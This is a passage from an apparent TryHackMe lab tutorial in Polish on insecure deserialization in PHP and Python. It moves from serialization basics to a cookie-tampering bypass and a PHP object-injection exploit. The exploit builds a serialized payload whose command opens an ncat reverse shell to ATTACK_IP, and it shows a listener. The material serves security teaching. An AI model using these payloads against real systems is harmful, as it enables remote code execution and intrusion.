
Dane wprowadzane przez użytkowników stale stanowią katalizator luk w zabezpieczeniach, stwarzając stałe zagrożenia na wielu platformach i w aplikacjach. Wykorzystanie danych wprowadzanych przez użytkowników, odSQLWstrzykiwanie skryptów między witrynami (cross-site scripting) to dobrze znane wyzwanie w zabezpieczaniu aplikacji internetowych. Inną, mniej poznaną, ale równie niebezpieczną luką związaną z danymi wprowadzanymi przez użytkownika jest **niebezpieczna deserializacja** .   

Niezabezpieczone ataki na deserializację występują, gdy aplikacja ufa danym zserializowanym na tyle, aby móc z nich korzystać bez weryfikacji ich autentyczności. To zaufanie może prowadzić do katastrofalnych skutków, ponieważ atakujący manipulują obiektami zserializowanymi w celu zdalnego wykonania kodu, eskalacji uprawnień lub przeprowadzenia ataków typu „odmowa usługi”. Ten typ podatności jest powszechny w aplikacjach, które serializują i deserializują złożone struktury danych w różnych środowiskach programistycznych, takich jak Java, .NET i…PHP, które często wykorzystują serializację do zdalnego wywoływania procedur, zarządzania sesjami i innych.  

Cele edukacyjne

﻿W tym pomieszczeniu zdobędziesz wszechstronne zrozumienie następujących kluczowych koncepcji:

- Jak działa proces serializacji i deserializacji  
    
- Potencjalne zagrożenia dla aplikacji internetowych
- Techniki eksploatacji
- Środki łagodzące

Wymagania wstępne dotyczące nauki

Przed rozpoczęciem zajęć w pokoju zaleca się zapoznanie się z następującymi tematami:

- [Jak działają strony internetowe](https://tryhackme.com/room/howwebsiteswork)
- [Protokoły i serwery](https://tryhackme.com/room/protocolsandservers)
- [OWASP10 najlepszych](https://tryhackme.com/room/owasptop10)



Zanim przejdziemy do szczegółowego omówienia niebezpiecznej deserializacji, kluczowe jest zrozumienie podstawowej koncepcji na prostym przykładzie.  

Serializacja

Pomyśl o serializacji jak o pakowaniu torby szkolnej rano. Masz książki, zeszyty, lunchbox i butelkę wody, które musisz uporządkować w torbie. Serializacja to po prostu zbieranie różnych informacji (np. notatek) i łączenie ich, aby ułatwić ich przechowywanie lub wysłanie znajomemu. 

![przepływ pracy serializacji](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/25179cc30d19a77dc77167e9d5ad7cd9.png)

W programowaniu serializacja to proces przekształcania stanu obiektu do formatu czytelnego dla człowieka lub binarnego (lub kombinacji obu), który można przechowywać, przesyłać i rekonstruować w razie potrzeby. Ta możliwość jest niezbędna w aplikacjach, w których dane muszą być przesyłane między różnymi częściami systemu lub przez sieć, na przykład w aplikacjach internetowych.PHP, proces ten wykonuje się za pomocą `serialize()`funkcji.

**Przykład**

```php
<?php
$noteArray = array("title" => "My THM Note", "content" => "Welcome to THM!");
$serialisedNote = serialize($noteArray);  // Converting the note into a storable format
file_put_contents('note.txt', $serialisedNote);  // Saving the serialised note to a file
?>
```

Poniższy wynik przedstawia zserializowany ciąg w `note.txt`pliku, który zawiera szczegóły dotyczące struktury i zawartości notatki. Jest on przechowywany w sposób umożliwiający łatwe zapisanie lub przesłanie.

**Notatka seryjna** :`a:2:{s:5:"title";s:12:"My THM Note";s:7:"content";s:12:"Welcome to THM!";}`  
  

Deserializacja

Wyobraź sobie, że przychodzisz do szkoły i potrzebujesz wszystkiego, co spakowałeś dziś rano. Deserializacja przypomina rozpakowywanie szkolnej torby przed pójściem do szkoły; wyjmujesz każdą rzecz, aby móc z niej korzystać przez cały dzień. Gdy rozpakowujesz torbę, aby wziąć książki i drugie śniadanie, deserializacja pobiera spakowane dane i przekształca je z powrotem w coś, z czego możesz korzystać. Deserializacja to proces konwersji sformatowanych danych z powrotem do obiektu. Jest ona kluczowa dla pobierania danych z plików, baz danych lub przez sieci, przywracając je do pierwotnego stanu do wykorzystania w aplikacjach.

![przepływ pracy deserializacji](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9a199439b155641fc89ddfd09376ca62.png)

Nawiązując do poprzedniego przykładu, oto w jaki sposób można deserializować dane notatek w PHP:  

```php
<?php
$serialisedNote = file_get_contents('note.txt');  // Reading the serialised note from the file
$noteArray = unserialize($serialisedNote);  // Converting the serialised string back into a PHP array
echo "Title: " . $noteArray['title'] . "<br>";
echo "Content: " . $noteArray['content'];
?>
```

Ten kod odczytuje zserializowaną notatkę z pliku i konwertuje ją z powrotem do tablicy, skutecznie rekonstruując oryginalną notatkę. Dyskusja na temat serializacji wymaga również omówienia kwestii bezpieczeństwa. Podobnie jak nie chciałbyś, aby ktoś manipulował Twoim torbą szkolną, tak niebezpieczna deserializacja może prowadzić do poważnych luk w zabezpieczeniach aplikacji. Atakujący mogą modyfikować zserializowane obiekty, aby wykonywać nieautoryzowane działania lub kraść dane.

Konkretne incydenty związane z lukami w zabezpieczeniach serializacji

Omówmy konkretne incydenty, w których luki w serializacji odegrały kluczową rolę w naruszeniach bezpieczeństwa cybernetycznego lub atakach, podkreślając znaczenie bezpiecznych praktyk serializacji. Te przykłady ilustrują, jak atakujący wykorzystują luki w serializacji do zdalnego wykonania kodu, wycieku danych i innych celów.

**Luka w zabezpieczeniach Log4j CVE-2021-44228**  

- **Incydent** : [Luka w zabezpieczeniach Log4j(otwiera się w nowej karcie)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)lub Log4Shell to krytyczna luka w zabezpieczeniach odkryta wApaczBiblioteka Log4j 2, powszechnie używana biblioteka logująca w aplikacjach Java. Luka umożliwia zdalnym atakującym wykonanie dowolnego kodu w systemach, wykorzystując niebezpieczną funkcję deserializacji biblioteki.  Aby dowiedzieć się więcej o tej luce, odwiedź pokój [Solar, exploiting log4j](https://tryhackme.com/r/room/solar) .
- **Skutki:**  Luka umożliwiała zdalne wykonywanie kodu, umożliwiając atakującym wykonywanie dowolnych poleceń w systemach, których dotyczyła. Umożliwiło to atakującym naruszenie krytycznej infrastruktury, co prowadziło do nieautoryzowanego dostępu do poufnych danych, zakłóceń w świadczeniu usług i potencjalnych ataków na łańcuch dostaw.

**Zdalne wykonanie kodu w serwerze WebLogic Server CVE-2015-4852**

- **Incydent** : Ta luka w zabezpieczeniach była związana ze sposobem działania [serwera Oracle WebLogic(otwiera się w nowej karcie)](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html)Dane deserializowane były przesyłane do protokołu T3. Atakujący mogli wysyłać na serwer złośliwie spreparowane obiekty, które po deserializacji prowadziły do ​​zdalnego wykonania kodu.
- **Wpływ** : Ta luka była szeroko wykorzystywana do uzyskiwania nieautoryzowanego dostępu do systemów, wdrażania oprogramowania ransomware lub kradzieży danych. Dotyczyła wszystkich wersji serwera WebLogic, które nie wyłączyły podatnej usługi ani nie załatały luki.

**JenkinsDeserializacja Java CVE-2016-0792**

- **Incydent** : [Jenkins(otwiera się w nowej karcie)](https://www.tenable.com/plugins/nessus/89034), popularny serwer automatyzacji używany w rozwoju oprogramowania, napotkał krytyczną lukę w zabezpieczeniach związaną z deserializacją Javy. Atakujący mogli wysyłać zmodyfikowane ładunki serializacyjne do Jenkinsa.Interfejs wiersza poleceń, który po deserializacji może pozwolić na wykonanie dowolnego kodu.
- **Skutki** : Umożliwiło to atakującym wykonywanie poleceń powłoki, potencjalnie przejmując serwer Jenkins, który często ma szeroki dostęp do środowiska programistycznego, obejmującego kod źródłowy, systemy kompilacji i potencjalnie środowiska wdrożeniowe.



Chociaż różne języki programowania mogą używać różnych słów kluczowych i funkcji do serializacji, podstawowa zasada pozostaje ![różne metody serializacji w różnych językach](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6eb6b58db4657f681b84ae0def396be4.png)spójna. Jak wiemy, serializacja to proces konwersji stanu obiektu do formatu, który można łatwo zapisać lub przesłać, a następnie zrekonstruować. Niezależnie od tego, czy jest to Java, Python, .NET czy…PHPKażdy język implementuje serializację w celu dostosowania specyficznych funkcji lub środków bezpieczeństwa właściwych dla jego środowiska. 

W odróżnieniu od innych typowych luk wykorzystujących natychmiastowe przetwarzanie danych wprowadzanych przez użytkownika, problemy związane z niebezpiecznym deserializacją wiążą się z głębszą interakcją z podstawową logiką aplikacji, często manipulując podstawowym zachowaniem jej komponentów.  

Przyjrzyjmy się teraz, jak jawnie obsługuje się serializację w różnych językach, omawiając jej funkcjonalność, składnię i unikalne cechy.

Serializacja PHP

W PHP serializacja odbywa się za pomocą `serialize()`funkcji. Funkcja ta konwertuje obiekt PHP lub tablicę na strumień bajtów reprezentujący dane i strukturę obiektu. Powstały strumień bajtów może zawierać różne typy danych, takie jak ciągi znaków, tablice i obiekty, co czyni go unikatowym. Aby to zilustrować, rozważmy aplikację do obsługi notatek, w której użytkownicy mogą zapisywać i pobierać swoje notatki. Utworzymy klasę PHP o nazwie **Notes** , która będzie reprezentować każdą notatkę i obsługiwać serializację i deserializację.

```php
class Notes {
    public $Notescontent;

    public function __construct($content) {
        $this->Notescontent = $content;
    }
}
```

W naszej aplikacji Notatki, gdy użytkownik zapisuje notatkę, serializujemy obiekt klasy Notatki za pomocą `serialize()`funkcji PHP. Konwertuje to obiekt na reprezentację ciągu znaków, którą można zapisać w pliku lub bazie danych. Przyjrzyjmy się poniższemu fragmentowi kodu, który serializuje obiekt klasy Notatki:

```php
$note = new Notes("Welcome to THM");
$serialized_note = serialize($note);
```

Kliknij link `http://MACHINE_IP/phptest/` i wprowadź dowolny ciąg znaków do serializacji lub deserializacji. Na przykład, jeśli wpiszesz ciąg **„Welcome to THM”** , wygenerowany zostanie wynik  `O:5:"Notes":1:{s:7:"content";s:14:"Welcome to THM";}` jak poniżej:

![aplikacja do notatek w PHP](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d20f7d66a362af30e482a3b81561ed3.png)

Zdekodujmy wynik:

- `O:5:"Notes":1:`:Ta część wskazuje, że zserializowane dane reprezentują obiekt klasy **Notes** , który ma jedną właściwość.
- `s:7:"content"`: Reprezentuje nazwę właściwości „ **content** ” o długości 7 znaków. W danych serializowanych ciągi znaków są reprezentowane przez znak, `s` po którym następuje długość ciągu i ciąg znaków w cudzysłowie. Liczby całkowite są reprezentowane przez znak, `i` po którym następuje wartość liczbowa bez cudzysłowu.
- `s:14:"Welcome to THM"`:To jest wartość właściwości **content** o długości 14 znaków.

Metody magiczne

PHP udostępnia kilka [magicznych metod(otwiera się w nowej karcie)](https://www.php.net/manual/en/language.oop5.magic.php)które odgrywają kluczową rolę w procesie serializacji. Poniżej wymieniono kilka ważnych metod:![odserializuj pre-req w PHP](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3eadbf114d33bd2c1feea8e41ff72d91.png)

- `__sleep()`: Ta metoda jest wywoływana na obiekcie przed serializacją. Może ona oczyścić zasoby, takie jak połączenia z bazą danych, i powinna zwrócić tablicę nazw właściwości, które powinny zostać zserializowane.
- `__wakeup()`:Ta metoda jest wywoływana podczas deserializacji. Umożliwia ona ponowne nawiązanie połączeń, których obiekt może potrzebować do prawidłowego działania.
- `__serialize()`:Od wersji PHP 7.4 ta metoda umożliwia dostosowanie danych serializacji poprzez zwrócenie tablicy reprezentującej zserializowaną formę obiektu.
- `__unserialize()`:Ten odpowiednik `__serialize()`umożliwia dostosowanie przywracania obiektu z jego zserializowanych danych.

Pyton  

Python używa modułu o nazwie **Pickle** do serializacji i deserializacji obiektów. Moduł ten konwertuje obiekt Pythona na strumień bajtów (i odwrotnie), umożliwiając jego zapisanie do pliku lub przesłanie przez sieć. Pickling to potężne narzędzie dla programistów Pythona, ponieważ obsługuje niemal wszystkie typy obiektów Pythona bez konieczności ręcznego zarządzania stanem obiektu. Zastosujemy tę samą aplikację Notes w Pythonie, co w PHP. Oto fragment kodu z tej  `app.py`klasy:

```python
import pickle
import base64

...
serialized_data = request.form['serialized_data']
notes_obj = pickle.loads(base64.b64decode(serialized_data))
message = "Notes successfully unpickled."
...

elif request.method == 'POST':
    if 'pickle' in request.form:
        content = request.form['note_content']
        notes_obj.add_note(content)
        pickled_content = pickle.dumps(notes_obj)
        serialized_data = base64.b64encode(pickled_content).decode('utf-8')
        binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
        message = "Notes pickled successfully."
```

**Proces trawienia**

- **Tworzenie klasy Notatki** : Ta klasa zarządza listą notatek. Udostępnia metody dodawania i pobierania notatek, ułatwiając zarządzanie stanem aplikacji.
- **Serializacja (piklowanie)** : Gdy użytkownik przesyła notatkę, instancja klasy Notes (w tym wszystkie notatki) jest serializowana za pomocą funkcji `pickle.dumps()`. Ta funkcja przekształca obiekt Pythona do formatu binarnego, który Python może później przekształcić z powrotem w obiekt.

**Wyświetlanie danych serializowanych (kodowanie Base64)**

- **Dlaczego warto używać Base64** : Dane serializowane są binarne i nie można ich bezpiecznie wyświetlać we wszystkich środowiskach. Dane binarne mogą zawierać bajty, które mogą ![pickle.load pre-req w Pythonie](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/30c29d8133d4a8bcbd803c521b9e32be.png)zakłócać działanie protokołów komunikacyjnych (takich jak HTTP). Base64 to schemat kodowania, który konwertuje dane binarne na zwykły tekst. Używa wyłącznie czytelnych znaków, co czyni go bezpiecznym do transmisji przez kanały nieobsługujące danych binarnych.
- **Proces kodowania** : Po serializacji `Notes`obiektu, dane binarne są kodowane do ciągu znaków base64 za pomocą kodu `base64.b64encode()`. Ciąg ten jest bezpieczny do wyświetlania w formacie HTML i można go łatwo przechowywać lub przesyłać.

**Deserializacja (odtrawianie)**

- **Dekodowanie Base64** : Podczas rozkodowywania ciąg znaków Base64 jest najpierw dekodowany z powrotem do formatu binarnego za pomocą kodu `base64.b64decode()`.
- **Rozpakowywanie** : Dane binarne są następnie przekazywane do `pickle.loads()`, który rekonstruuje oryginalny obiekt Pythona ze strumienia binarnego.

Ponownie kliknij link `http://MACHINE_IP:5000` i wpisz ciąg **Welcome to THM** :

![aplikacja do notatek w Pythonie](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31e397f12ca8453606e381c3b19621a8.png)  

- **Pickling** : Podczas picklingu ten ciąg znaków jest konwertowany do formatu binarnego, który nie jest czytelny dla człowieka. Ten format binarny zawiera informacje o typie danych, samych danych oraz inne niezbędne metadane do rekonstrukcji obiektu.
- **Kodowanie Base64** : Następnie binarna postać zakodowanych danych jest kodowana do ciągu Base64, który może wyglądać następująco `gASVIQAAAAAAAACMBFdlbGNvbWXCoGFkZYFdcQAu`:

Analizując formaty serializacji, omówiliśmy, jak ta kluczowa funkcjonalność jest implementowana w PHP i Pythonie. PHP wykorzystuje funkcje `serialize()`i `unserialize()`do zarządzania konwersją obiektów i innych typów danych do formatu, który można łatwo zrekonstruować i przechowywać. Podobnie Python wykorzystuje moduł  `Pickle` do serializacji obiektów do strumienia bajtów i deserializacji ich z powrotem do stanu pierwotnego.  

Poza tymi dwoma językami, serializacja jest wspólną cechą różnych środowisk programistycznych, z których każde ma unikalne implementacje i biblioteki. W Javie serializacja obiektów jest ułatwiona poprzez interfejs `Serializable`, umożliwiając konwersję obiektów na strumienie bajtów i odwrotnie, co jest niezbędne do komunikacji sieciowej i trwałości danych. W przypadku platformy .NET serializacja znacząco rozwinęła się na przestrzeni lat. Początkowo `BinaryFormatter`była powszechnie używana do serializacji binarnej; jednak obecnie jej stosowanie jest odradzane  ze względu na obawy dotyczące bezpieczeństwa . Nowoczesne aplikacje .NET zazwyczaj wykorzystują`System.Text.Json`  …JSONSerializacja, czyli **System.Xml.Serialization** dla zadań XML, odzwierciedlająca przejście w kierunku bezpieczniejszych i bardziej  ujednoliconych formatów wymiany danych. Ruby oferuje prostotę dzięki swojemu `Marshal`modułowi, znanemu z serializacji i deserializacji obiektów, a w przypadku formatów bardziej czytelnych dla człowieka często wykorzystuje…YAMLPodejście każdego języka do serializacji odzwierciedla konteksty jego użycia i kwestie bezpieczeństwa, podkreślając znaczenie zrozumienia i prawidłowego wdrożenia serializacji w celu zapewnieniauczciwośći bezpieczeństwo danych w aplikacjach internetowych.



﻿﻿Po dogłębnym zrozumieniu serializacji w różnych językach programowania, przejdziemy teraz do kluczowego aspektu cyberbezpieczeństwa, czyli wykorzystywania i minimalizowania luk w zabezpieczeniach związanych z serializacją. Zanim przejdziemy do omówienia szczegółów technik eksploatacji, kluczowe jest zrozumienie, jak identyfikować te luki w zabezpieczeniach aplikacji, niezależnie od tego, czy masz dostęp do kodu (testowanie białej skrzynki), czy nie (testowanie czarnej skrzynki).   

Dostęp do kodu źródłowego![lupa nad cyframi](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f7fc8a78e53eaa644b6c8a9fb6d4369c.png)

Gdy istnieje dostęp do kodu źródłowego, identyfikacja luk w serializacji może być prostsza, ale wymaga dogłębnego zrozumienia, na co zwracać uwagę. Na przykład, poprzez przegląd kodu, możemy zbadać kod źródłowy pod kątem użycia funkcji serializacji, takich jak `serialize()`, `unserialize()`, `pickle.loads(`) i innych. Musimy zwrócić szczególną uwagę na każdy punkt, w którym dane wejściowe użytkownika mogą być przekazywane bezpośrednio do tych funkcji.

Brak dostępu do kodu źródłowego

Podczas audytu aplikacji bez dostępu do jej kodu źródłowego wyzwaniem jest wywnioskowanie, w jaki sposób przetwarza ona dane, opierając się wyłącznie na zewnętrznych obserwacjach i interakcjach. Jest to powszechnie nazywane **testowaniem czarnej skrzynki** . W tym przypadku koncentrujemy się na wykrywaniu wzorców w odpowiedziach serwera i plikach cookie, które mogą wskazywać na użycie serializacji i potencjalne luki w zabezpieczeniach. Jako pentesterzy, dodawanie tyldy `~`na końcu nazwy pliku PHP jest powszechną techniką stosowaną przez atakujących, aby uzyskać dostęp do kopii zapasowych lub plików tymczasowych utworzonych przez edytory tekstu lub systemy kontroli wersji. Podczas edycji lub zapisywania pliku, niektóre edytory tekstu lub systemy kontroli wersji mogą tworzyć kopię zapasową oryginalnego pliku z tyldą dodaną do nazwy pliku.

**Analiza odpowiedzi serwera**

- **Komunikaty o błędach** : Niektóre komunikaty o błędach mogą pośrednio wskazywać na problemy z serializacją. Na przykład PHP może zgłaszać błędy lub ostrzeżenia zawierające frazy takie jak `**unserialize()**` „ **Błąd deserializacji obiektu”** , które zdradzają ukryte procesy serializacji i potencjalne luki w zabezpieczeniach.
- **Niespójności w działaniu aplikacji** : Nieoczekiwane zachowanie w odpowiedzi na zmanipulowane dane wejściowe (np. zmodyfikowane pliki cookie lub dane POST) może sugerować problemy z deserializacją i obsługą danych. Obserwacja sposobu, w jaki aplikacja obsługuje zmienione dane serializowane, może dostarczyć wskazówek dotyczących potencjalnie podatnego kodu.

**Badanie plików cookie**

Pliki cookie są często używane do przechowywania danych szeregowych w aplikacjach internetowych. Analizując zawartość plików cookie, można zazwyczaj wywnioskować:

- **Wartości zakodowane w formacie Base64 w plikach cookie (PHPi .NET)** : Jeśli pliki cookie zawierają dane wyglądające na zakodowane w formacie Base64, ich dekodowanie może ujawnić obiekty zserializowane lub struktury danych. PHP często używa serializacji do zarządzania sesjami i przechowywania zmiennych sesji w formacie zserializowanym.
- **Stan widoku ASP.NET** : Aplikacje .NET mogą wykorzystywać serializację w stanie widoku przesyłanym do przeglądarki klienta. `__VIEWSTATE`Czasami można zobaczyć pole o nazwie , zakodowane w formacie Base64. Jego dekodowanie i analiza może ujawnić, czy zawiera ono zserializowane dane, które mogłyby zostać wykorzystane.

W tym zadaniu nauczyliśmy się identyfikować luki w zabezpieczeniach. W kolejnych zadaniach przeanalizujemy różne techniki wykorzystywania luk.


Aktualizowanie właściwości obiektu

W tym zadaniu przeanalizujemy praktyczny przykładPHP, wykorzystując prostą aplikację do udostępniania notatek jako studium przypadku. Nasza aplikacja do udostępniania notatek umożliwia użytkownikom łatwe tworzenie, zapisywanie i udostępnianie notatek. Użytkownicy mogą wprowadzać swoje notatki do aplikacji, które są następnie zapisywane do wykorzystania w przyszłości. Dodatkowo użytkownicy mogą udostępniać swoje notatki innym osobom, ułatwiając współpracę i wymianę informacji. Aplikacja zawiera również funkcje oparte na subskrypcji, dzięki czemu tylko subskrybenci mają dostęp do niektórych funkcji, takich jak udostępnianie notatek. Dostęp do strony internetowej można uzyskać, klikając link `http://MACHINE_IP/case1`.

![aplikacja do udostępniania notatek w PHP](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d3b4a29dd4ca6d3357f3b5372e368468.png)

Przyjrzyjmy się sposobowi tworzenia aplikacji.

**Definiowanie klasy Notatki**

Aplikacja ma `Notes`klasę reprezentującą notatkę w naszej aplikacji. Ta klasa ma trzy właściwości prywatne: `user`, `role`i`isSubscribed`Mamy również metody setter i getter do manipulowania `isSubscribed`właściwością.  

```php
class Notes {

    private $user;
    private $role;
    private $isSubscribed;

    public function __construct($user, $role, $isSubscribed) {
        $this->user = $user;
        $this->role = $role;
        $this->isSubscribed = $isSubscribed;
    }

    public function setIsSubscribed($isSubscribed) {
        $this->isSubscribed = $isSubscribed;
    }

    public function getIsSubscribed() {
        return $this->isSubscribed;
 }
}
```

**Przechowywanie danych użytkownika w plikach cookie**

Gdy użytkownik odwiedza naszą aplikację po raz pierwszy, ustawiany jest zserializowany plik cookie zawierający jego dane. Obejmuje on nazwę użytkownika, rolę i status subskrypcji ( `isSubscribed`). Jeśli użytkownik jest członkiem płatnym ( **isSubscribed = true** ), może udostępniać notatki.

![Sprawdź kartę elementu, aby wyświetlić pliki cookie](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e5ce341b090b04e5749ad1834199bba2.png)  

**Wykorzystanie podatności**

W tym kroku pokażemy, w jaki sposób atakujący może wykorzystać lukę w zabezpieczeniach, modyfikując zserializowaną wartość pliku cookie, aby uzyskać nieautoryzowany dostęp do notatek udostępniania.

- **Zserializowany plik cookie** : Po zdekodowaniu zakodowanej w formacie base64 wartości pliku cookie otrzymujemy następującą zserializowaną reprezentację obiektu Notes:

```php
O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
```

Jak już wiemy, w serializacji PHP, nazwa klasy jest dodawana przed nazwami właściwości, jeśli nie jest publiczna, aby zapewnić unikalność i ułatwić deserializację. Jest to część sposobu, w jaki PHP wewnętrznie obsługuje serializację i deserializację obiektów. Podczas serializacji obiektu, PHP przechowuje jego właściwości i nazwę klasy. Dzięki temu, gdy obiekt jest później deserializowany, PHP wie, którą klasę utworzyć i jak poprawnie przypisać zserializowane dane do właściwości obiektu. Rozłóżmy zserializowaną notatkę na jej składniki:

- **O:5:"Notes":3** : Reprezentuje obiekt (O) o nazwie klasy Notes, który ma trzy właściwości.
- **s:4:"user";s:5:"guest"** : Oznacza ciąg(i) o długości 4 znaków, reprezentujący właściwość  `user` o wartości „ **guest** ”.
- **s:4:"role";s:5:"guest"** : Podobnie jak poprzednio, reprezentuje właściwość `role`o wartości „ **guest** ”.
- **s:12:"isSubscribed";b:0** : Reprezentuje właściwość logiczną (b) o nazwie `isSubscribed`zawierającej wartość false (0).

Wykorzystanie podatności

W obecnej sytuacji, gdy użytkownik chce spróbować udostępnić notatkę, pojawia się następujące okno podręczne:

![Okienko z informacją „Proszę zapisać się, aby udostępnić notatkę”](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9bfc64dfa33447bc22bb8adb2b37ca9c.png)  

Co dzieje się po stronie zaplecza? Kod PHP zaplecza weryfikuje przychodzące pliki cookie, deserializuje je, a następnie sprawdza, czy użytkownik jest zapisany. Naszym głównym zadaniem jest ominięcie tego.

Załóżmy, że atakujący przechwyci tę zserializowaną wartość pliku cookie i zmieni jej `isSubscribed`wartość z false (0) na true (1). Atakujący może manipulować stanem subskrypcji bez autoryzacji, zmieniając wartość logiczną w zserializowanych danych.

![wyskakujące okienko z wartością flagi](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3bc45283cd430f96411a2b62afa41cf6.png)

Po modyfikacji atakujący ponownie zakodowałby zserializowane dane w formacie base64 i zastąpił oryginalną wartość pliku cookie zmodyfikowaną wartością. Umożliwiłoby mu to nieautoryzowany dostęp do udostępniania notatek na innych platformach, omijając zamierzone ograniczenia subskrypcji.


Wstrzykiwanie obiektów to luka w zabezpieczeniach wynikająca z niezabezpieczonej deserializacji danych w aplikacjach internetowych. Występuje, gdy niezaufane dane są deserializowane do obiektu, co pozwala atakującym manipulować zserializowanymi danymi w celu wykonania dowolnego kodu, co prowadzi do poważnych zagrożeń bezpieczeństwa. W tym zadaniu zbadamy, jak działa wstrzykiwanie obiektów i zademonstrujemy jego wpływ na prosty przykład.PHPfragment kodu. 

Jak wiadomo, podatność wynika z procesu serializacji i deserializacji, który umożliwia konwersję obiektów PHP do formatu nadającego się do przechowywania (serializacja) i rekonstrukcję ich z powrotem do postaci obiektów (deserializacja). Chociaż serializacja i deserializacja są przydatne do przechowywania i przesyłania danych, mogą również stwarzać zagrożenia bezpieczeństwa, jeśli nie zostaną prawidłowo wdrożone.

Aby wykorzystać lukę w zabezpieczeniach PHP Object Injection, aplikacja powinna zawierać klasę zawierającą magiczną metodę PHP (np. `__wakeup`or `__sleep`), którą można wykorzystać do złośliwych celów. Wszystkie klasy biorące udział w ataku powinny zostać zadeklarowane przed wywołaniem `unserialize()`metody (chyba że obsługiwane jest automatyczne ładowanie obiektów).  

**Przykład**

Rozważmy `index.php`fragment kodu, który pokazuje serializację i deserializację za pomocą funkcji `serialize()`i `unserialize()`. Kod akceptuje **dekodowanie** lub **kodowanie** parametrów **GET** i odpowiednio konwertuje wartość podaną przez użytkownika.

```php
<?php
class UserData {
    private $data;
    public function __construct($data) {
        $this->data = $data;
    }
..
require 'test.php';
if(isset($_GET['encode'])) {
    $userData = new UserData($_GET['encode']);
    $serializedData = serialize($userData);
    $base64EncodedData = base64_encode($serializedData);
    echo "Normal Data: " . $_GET['encode'] . "<br>";
    echo "Serialized Data: " . $serializedData . "<br>";
    echo "Base64 Encoded Data: " . $base64EncodedData;

} elseif(isset($_GET['decode'])) {
    $base64EncodedData = $_GET['decode'];
    $serializedData = base64_decode($base64EncodedData);
    $test = unserialize($serializedData);
    echo "Base64 Encoded Serialized Data: " . $base64EncodedData . "<br>";
    echo "Serialized Data: " . $serializedData;

...
```

Na przykład, jeśli wyślemy wejściowy **hellothm** przez adres URL [http://MACHINE_IP/case2/?encode=hellothm(otwiera się w nowej karcie)](http://machine_ip/case2/?encode=hellothm), otrzymamy następujący wynik:

![stan serializowany w PHP](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/711bd1f1f1922a3ae8dc0fe0e32fac81.png)

Widzimy, że kod zawiera plik o nazwie `test.php`. Z analizy kodu źródłowego lub analizy, czy framework jest open source, pentester wie, że `test.php`zawiera on klasę o nazwie `MaliciousUserData`pokazanej poniżej:

```php
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server
    
    public function __wakeup() { 
    exec($this->command);
...

?>
```

  

W powyższym kodzie, poprzez niebezpieczną deserializację, możliwe jest manipulowanie właściwościami obiektu, w tym modyfikowanie `command` właściwości klasy `MaliciousUserData`w powyższym kodzie. Można to osiągnąć poprzez utworzenie specjalnie spreparowanego, serializowanego ciągu zawierającego żądane wartości właściwości.  Na przykład, jeśli chcemy zmodyfikować `command`właściwość, aby wykonać inne polecenie lub połączyć się z innym serwerem, możemy zserializować obiekt z żądaną wartością właściwości, a następnie wstrzyknąć ją do podatnej na atak `unserialize()`funkcji. W ten sposób, po deserializacji, zmanipulowana wartość właściwości zostanie załadowana do obiektu.

Należy pamiętać, że podczas niebezpiecznej deserializacji nie można bezpośrednio aktualizować definicji `__wakeup`samej metody. `__wakeup`Metoda jest częścią definicji klasy i pozostaje statyczna podczas procesu deserializacji. Można jednak modyfikować zachowanie lub właściwości obiektu w metodzie `__wakeup`. Oznacza to, że chociaż definicja metody pozostaje stała, jej działania podczas deserializacji można modyfikować w celu uzyskania różnych rezultatów.  

Teraz, gdy znamy już podstawy, czas przygotować ładunek.

Przygotowanie ładunku

Jak wspomniano wcześniej, wywoływanie innej klasy jest standardową funkcją w PHP i można wyświetlić kod tego pliku, jeśli docelowa strona korzysta z kodu open source. Kod ten `index.php`bezmyślnie odserializuje dane wejściowe, nie przeprowadzając żadnej sanityzacji. Jaka jest tu opcja? Co jeśli zmodyfikujemy klasę `MaliciousUserData`i jej `command`atrybut tak, aby `__wakeup`funkcja była wywoływana z wartością podaną przez atakującego?

Utwórzmy kod PHP w naszym AttackBoxie, który będzie generował złośliwe, zserializowane dane użytkownika.

```php
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>
```

- W powyższym kodzie funkcja `_wakeup()`klasy `MaliciousUserData`( `test.php`) wykona polecenie powłoki odwrotnej przy użyciu Ncat, aby połączyć się ze wskazanym adresem IP ( `ATTACK_IP`) i portem ( `4444`) z flagą -e, aby wykonać polecenie `/bin/sh`jako powłoka
- Po utworzeniu pliku uruchom go `php index.php`w terminalu. Spowoduje to zwrócenie zakodowanego w formacie base64, serializowanego obiektu klasy  `MaliciousUserData`.
- Wygenerowany ciąg zakodowany w formacie Base64 będzie wyglądał następująco:  `TzoxNzoiTWFsaWNp[Redacted]`.  
- Uruchom program nasłuchujący Netcat na porcie 4444 za pomocą polecenia  `nc -nvlp 4444`w AttackBox.
